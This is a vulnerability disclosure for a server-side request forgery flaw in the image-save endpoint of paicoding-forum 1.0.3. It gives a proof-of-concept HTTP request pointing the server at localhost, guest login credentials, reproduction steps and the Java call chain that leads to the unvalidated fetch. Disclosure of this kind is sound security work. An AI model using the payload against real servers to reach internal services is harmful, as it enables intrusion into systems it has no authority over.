# SSRF in paicoding Forum System
## 1. Vulnerability Description

The paicoding forum system contains a Server-Side Request Forgery (SSRF) vulnerability in its image hosting functionality. This vulnerability allows low privileged users to craft malicious URLs that cause the server to initiate HTTP requests to arbitrary addresses.

## 2. Affected Components

- **Project Name**: paicoding-forum 
- **Version**: 1.0.3
- **Affected API**: http://192.168.237.1:8080/image/save
- **Affected Files**:
  - `paicoding-service/src/main/java/com/github/paicoding/forum/service/image/service/ImageServiceImpl.java`
  - `paicoding-web/src/main/java/com/github/paicoding/forum/web/common/image/rest/ImageRestController.java`

## 3.POC

```
GET /image/save?img=http://127.0.0.1:8888 HTTP/1.1
Host: 192.168.237.1:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://192.168.237.1:8080/article/edit
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_520556228c0113270c0c772027905838=1759675978; commentposter=emer; posterurl=http%3A%2F%2F192.168.237.1%2F; pb-cms-username=1; pb-cms-qq=1; pb-cms-email=1; f-device=80b3a4fc-ac8e-425a-8518-1d84afa89b77; Hm_lvt_2745ad927051c4bc7b7ee34b781df793=1762670146; HMACCOUNT=8A7910A5E3CAF83A; JSESSIONID=0E1EBF3A759ED66CACDC7FB9F9F44117; f-session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYWlfY29kaW5nIiwiZXhwIjoxNzY1MjY4OTk3LCJzIjoiYWMxNGM0NjkuMTc2MjY3Njk5NzgzMy40MDg0ODIxOTAiLCJ1IjoyfQ.l7TLmexRTbi3HIhj-GYPdM3fHSiJuW6bPlOAiTehrEc; Hm_lpvt_2745ad927051c4bc7b7ee34b781df793=1762677014
Connection: close
```

1.login in with guest/123456

2.click the write article button

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091655718.png)
3.write a url and capture the request with burpsuite
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091655673.png)
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091656322.png)

it will return a imagePath
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091653743.png)

4.before we request,just start a web service with python in d:/，we can also see the ssrf
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091653444.png)

5.finally，request the imagePath
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091653555.png)

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091659394.png)

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091700951.png)

## 4. Vulnerability Details

**Complete Call Chain**:
```
HTTP Request (GET/POST /image/save?img=malicious_URL)
    ↓
ImageRestController.save(String imgUrl)  // Line 81: Receives user-provided URL
    ↓
ImageServiceImpl.saveImg(String img)  // Line 99: Calls saveImg method
    ↓
imgReplaceCache.get(img)  // Line 106: Gets from cache, triggers load if cache miss
    ↓
LoadingCache automatically calls CacheLoader.load(String img)  // Line 49: Guava Cache mechanism auto-triggers
    ↓
FileReadUtil.getStreamByFileName(String img)  // Line 51: Initiates HTTP request
    ↓
Server initiates request to malicious URL (SSRF attack occurs)
```

### 4.1 Vulnerability Location
Begin with the ImageRestController.java,it will receive the image url we write
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091634832.png)

then go to the saveImg()
![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091638374.png)

because we just first request the image url,Guava can not find the key in cache

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091641096.png)

Guava will automatically calls `load(String img)` method

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091645412.png)

then go to getStreamByFileName(),it will request the image url we write and download it,trigger SSRF

![](https://cdn.jsdelivr.net/gh/Huu1j/Huuj_img@main/img/202511091647339.png)

